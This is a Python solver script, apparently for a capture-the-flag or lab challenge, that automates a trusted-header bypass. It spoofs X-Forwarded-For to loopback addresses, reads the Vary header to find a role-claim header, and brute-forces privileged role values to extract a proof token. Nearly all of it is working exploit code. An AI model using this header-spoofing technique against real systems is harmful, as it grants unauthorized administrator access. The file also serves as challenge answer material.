"""D31 "Framework Roulette": two-stage trusted-header bypass on an unfamiliar stack.

Kit: /api/clues = {framework, feature_route, component_route, current_role}. GET feature -> 403
{"error":"gateway_context_rejected","evaluated_client":"10.x"}; with X-Forwarded-For: 127.0.0.1 -> 403
{"error":"topology_proof_rejected","policy":"staff_only"} and the response `Vary` names the per-target role-claim
header (x-arena-<hex6>); sending that header = administrator -> {"ok":true,"evidence":"proof_<hex32>"}.
NB: the error text contains "proof_rejected" -- only accept a proof from a JSON `evidence` with ok:true / hex shape.
"""
import json
import re
import urllib.error
import urllib.request

from lib import websolve

KEY_MAP = [(r"^component_route$", "day31_web_framework_roulette")]

IPS = ("127.0.0.1", "::1", "localhost")
ROLES = ("administrator", "admin", "staff", "superuser", "root", "owner", "manager")
STD = {"accept", "accept-encoding", "accept-language", "origin", "cookie", "authorization", "user-agent", "x-forwarded-for"}
REAL = re.compile(r"\bproof_[0-9a-f]{16,}\b")


def _get(url, headers):
    h = {"User-Agent": websolve.UA, "Accept": "application/json, */*;q=0.8"}
    h.update(headers)
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read(1 << 20).decode("utf-8", "replace"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read(1 << 20).decode("utf-8", "replace"), e.headers
    except Exception:  # noqa: BLE001
        return 0, "", None


def _proof(body):
    try:
        j = json.loads(body or "")
    except ValueError:
        j = None
    if isinstance(j, dict):
        for k in ("evidence", "proof", "flag"):
            v = j.get(k)
            if isinstance(v, str) and REAL.search(v):
                return REAL.search(v).group()
        if "error" in j:
            return None
    m = REAL.search(body or "")
    return m.group() if m else None


def _vary(hd):
    if hd is None:
        return []
    out = []
    for v in hd.get_all("Vary") or []:
        out += [h.strip() for h in v.split(",") if h.strip() and h.strip().lower() not in STD]
    return out


def exploit(base, clues):
    feat = (clues or {}).get("feature_route") or ""
    if not feat.startswith("/"):
        return None
    url = base.rstrip("/") + feat
    _, body, _ = _get(url, {})
    p = _proof(body)
    if p:
        return p
    for ip in IPS:
        _, body, hd = _get(url, {"X-Forwarded-For": ip})
        p = _proof(body)
        if p:
            return p
        if "gateway_context_rejected" in (body or ""):
            continue
        names = _vary(hd) + re.findall(r"x-arena-[0-9a-f]+", body or "", re.I)
        for name in dict.fromkeys(names):
            for role in ROLES:
                _, body2, _ = _get(url, {"X-Forwarded-For": ip, name: role})
                p = _proof(body2)
                if p:
                    return p
        break
    return None


HANDLERS = {"day31_web_framework_roulette": exploit}
